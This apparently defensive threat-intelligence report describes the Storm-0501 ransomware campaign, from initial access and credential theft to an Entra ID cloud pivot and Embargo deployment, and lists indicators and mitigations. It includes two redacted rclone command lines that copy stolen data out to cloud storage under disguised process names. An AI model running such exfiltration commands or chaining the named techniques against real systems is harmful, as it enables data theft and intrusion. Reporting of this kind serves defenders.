@@ -1,0 +1,93 @@
+Overview of the Storm-0501 Campaign
+Storm-0501 is a financially motivated and highly sophisticated threat actor group that has been operational since 2021. Over time, they have significantly expanded their scope from targeting U.S. school districts with Sabbath ransomware to becoming a Ransomware-as-a-Service (RaaS) affiliate. They have deployed multiple ransomware payloads for extortion, including:
+Hive
+BlackCat (ALPHV)
+LockBit
+Embargo ransomware (latest)
+Their operations now focus on government sectors, critical infrastructure, manufacturing, transportation, and law enforcement agencies. The hallmark of their attack is the pivot from on-premises to cloud environments, exploiting weak or poorly managed credentials and synchronization between Active Directory (AD) and Microsoft Entra ID.
+Detailed Tactics, Techniques, and Procedures (TTPs)
+1. Initial Access: Multi-Pronged Approach
+Storm-0501 gained initial access through multiple vectors, including:
+Access Brokers: They worked closely with access brokers like Storm-0249 and Storm-0900, who provided stolen credentials. These brokers sold privileged account details, including administrator-level credentials, to the attackers, facilitating their entry.
+Vulnerability Exploitation: In cases where credentials were not available, Storm-0501 exploited publicly disclosed vulnerabilities in unpatched, internet-facing systems. The most notable vulnerabilities include:
+Zoho ManageEngine (CVE-2022-47966): A remote code execution vulnerability that gave them complete access to ManageEngine instances.
+Citrix NetScaler (CVE-2023-4966): A critical vulnerability in Citrix ADC and Gateway products.
+ColdFusion 2016 (CVE-2023-29300 & CVE-2023-38203): Exploited in outdated ColdFusion environments, often used by businesses for web application development.
+Once inside, the attackers rapidly escalated privileges by exploiting weak or default credentials left by system administrators or security misconfigurations, such as over-privileged accounts.
+2. Reconnaissance: Detailed Network Discovery
+Once administrative access was secured, Storm-0501 launched an extensive reconnaissance campaign across the network to identify high-value assets, critical business applications, and privileged users, including Domain Administrators and Global Admins.
+They employed a combination of standard Windows commands and more sophisticated tools:
+Windows Tools: They used standard Windows utilities, such as:
+systeminfo.exe: To gather information about the system hardware and OS versions.
+net.exe & nltest.exe: To enumerate network shares, domains, and trusted relationships within the AD forest.
+tasklist.exe: To inspect running processes for security software or other potential defense mechanisms.
+ADRecon.ps1 (obfuscated as obfs.ps1): This PowerShell script allows attackers to gather critical data on Active Directory domains, trust relationships, GPOs, and privileged accounts.
+OSQuery: An open-source endpoint visibility tool was used to query deeper information about installed software, running services, and security postures of endpoints.
+The goal was to identify Domain Admin accounts and critical servers such as Domain Controllers, as these represent the most valuable targets for the attacker to compromise.
+3. Credential Harvesting: Secrets Extraction and Brute Force
+With administrative privileges, Storm-0501 moved to steal cached credentials from compromised systems using Impacket’s SecretsDump module. This tool enabled them to perform credential dumping and NTLM hash extraction over the network. These credentials were used for lateral movement to gain further access across the network.
+Techniques observed:
+Pass-the-Hash (PtH): Attackers reused stolen NTLM hashes to authenticate across systems without needing the plaintext password.
+Mimikatz: The widely used tool was employed for extracting credentials from memory on Windows hosts.
+KeePass Secrets Extraction: Using Find-KeePassConfig.ps1, they identified the KeePass database and its associated master keys, which they then used to unlock saved passwords for further exploitation.
+In some cases, brute force attacks were launched on user accounts with weak passwords, particularly those lacking multi-factor authentication (MFA).
+4. Lateral Movement: Network Spread via Admin Privileges
+Armed with valid credentials, Storm-0501 rapidly moved laterally within the environment, compromising more machines and gathering further credentials. They relied heavily on Cobalt Strike, a post-exploitation toolkit, to achieve this. Cobalt Strike Beacons were deployed in the form of DLL files (e.g., cs240.dll) and ActiveX objects (e.g., theme.ocx, fel.ocx), which allowed them to maintain persistent control and send commands directly to compromised systems.
+rundll32.exe and regsvr32.exe were used to launch these malicious DLLs, further hiding their presence by masquerading as legitimate processes.
+The lateral movement phase often concluded with the compromise of Domain Admin accounts and Domain Controllers, granting the attackers full control over the domain and access to all systems within the network.
+5. Data Exfiltration: Covert Cloud-Based Data Transfer
+Once high-value data was identified, Storm-0501 performed data exfiltration using Rclone, an open-source tool, often disguised as legitimate processes. Rclone was configured to transfer sensitive files to cloud storage providers, such as MegaSync.
+Command examples:
+
+
+scvhost.exe --config C:\Windows\Debug\a.conf copy [REDACTED UNC PATH] [REDACTED]
+svhost.exe copy --filter-from [REDACTED] config:[REDACTED] -q --ignore-existing --auto-confirm --multi-thread-streams 11 --transfers 11
+They also tampered with security monitoring tools, such as disabling or bypassing endpoint protection using PowerShell cmdlets, ensuring that the data exfiltration would go undetected.
+6. On-Premises to Cloud Pivot: Exploiting Microsoft Entra ID
+In a major escalation, Storm-0501 pivoted from on-premises environments to the cloud by compromising Microsoft Entra Connect Sync accounts. These synchronization accounts allowed them to synchronize passwords between Active Directory and Microsoft Entra ID.
+Key actions:
+Extracting plaintext credentials for sync accounts using Impacket tools and stealing DPAPI (Data Protection API) keys to decrypt account credentials.
+Compromising Microsoft Entra Connect Sync accounts allowed them to:
+Reset passwords for hybrid accounts.
+Gain access to Microsoft Graph API to manage cloud resources and user accounts.
+This pivot gave the attackers access to the cloud environment, where they established a persistent backdoor by creating a federated domain in the tenant. This allowed them to impersonate any user in the tenant and bypass MFA using SAML tokens generated by AADInternals (an open-source PowerShell module for managing Azure AD).
+7. Cloud Session Hijacking: Full Cloud Takeover
+In several cases, Storm-0501 hijacked on-premises user accounts with corresponding Microsoft Entra ID accounts, particularly those with disabled MFA or weak authentication policies.
+Steps in the hijacking process:
+Resetting on-premises passwords, which synced with the cloud, allowing the attackers to log in from any device.
+Using stolen Microsoft Entra Directory Synchronization Account credentials to reset user passwords using AADInternals’ Set-AADIntUserPassword cmdlet.
+Hijacking cloud sessions by extracting Microsoft Entra access tokens, allowing them to bypass MFA and impersonate users in critical roles.
+8. Ransomware Deployment: Double Extortion via Embargo
+Once the attackers had full control of the network, they deployed Embargo ransomware, a newly developed strain written in Rust. Embargo affiliates like Storm-0501 employed double extortion tactics, encrypting files and threatening to leak sensitive data unless a ransom was paid.
+Details:
+The ransomware binaries were named PostalScanImporter.exe and win.exe, and were distributed via a scheduled task named SysUpdate using Group Policy Objects (GPO).
+Encrypted files had extensions such as .partial, .564ba1, and .embargo.
+They utilized advanced encryption algorithms and multi-threaded processes to ensure rapid encryption of targeted systems.
+Extended Indicators of Compromise (IOCs)
+File Name	SHA-256	Description
+PostalScanImporter.exe, win.exe	efb2f6452d7b0a63f6f2f4d8db49433259249df598391dd79f64df1ee3880a8d	Embargo ransomware
+win.exe	a9aeb861817f3e4e74134622cbe298909e28d0fcc1e72f179a32adc637293a40	Embargo ransomware
+name.dll	caa21a8f13a0b77ff5808ad7725ff3af9b74ce5b67426c84538b8fa43820a031	Cobalt Strike
+cs240.dll	53e2dec3e16a0ff000a8c8c279eeeca8b4437edb8ec8462bfbd9f64ded8072d9	Cobalt Strike
+fel.ocx	827f7178802b2e92988d7cff349648f334bc86317b0b628f4bb9264285fccf5f	Cobalt Strike
+theme.ocx	ee80f3e3ad43a283cbc83992e235e4c1b03ff3437c880be02ab1d15d92a8348a	Cobalt Strike
+obfs.ps1	d065623a7d943c6e5a20ca9667aa3c41e639e153600e26ca0af5d7c643384670	ADRecon
+recon.ps1	c08dd490860b54ae20fa9090274da9ffa1ba163f00d1e462e913cf8c68c11ac1	ADRecon
+Advanced Mitigation and Protection Strategies
+The following actions should be taken immediately to prevent Storm-0501 attacks or mitigate ongoing incidents:
+Mandatory MFA for All Admin Accounts:
+Enforce Multi-Factor Authentication (MFA) for all administrative accounts, especially for Microsoft Entra ID and Azure AD roles.
+Implement Conditional Access policies that require MFA for all users logging into sensitive or administrative environments.
+Tighten Conditional Access Policies:
+Restrict sign-ins from unknown or untrusted IP addresses using Conditional Access.
+Limit access to Global Administrator accounts to specific, trusted locations.
+Monitor Sync Accounts and Cloud Infrastructure:
+Monitor Microsoft Entra Connect Sync accounts for any unusual activity, particularly password resets and role changes.
+Set up advanced monitoring in Microsoft Defender for Identity and Microsoft Defender for Cloud Apps to detect suspicious sign-ins, token abuse, and backdoor creation.
+Strengthen Credential Hygiene:
+Audit privileged accounts regularly, ensuring that least privilege is applied. Rotate administrative passwords and review permissions to prevent unauthorized access.
+Ensure password complexity requirements are in place and discourage password reuse across systems.
+Group Policy and Task Reviews:
+Conduct a comprehensive review of Group Policy Objects (GPOs) and scheduled tasks for any abnormal entries, particularly those linked to SysUpdate or other suspicious tasks.
+Prevent Data Exfiltration:
+Implement Data Loss Prevention (DLP) policies to monitor and block suspicious file transfers to unauthorized cloud storage providers like MegaSync.
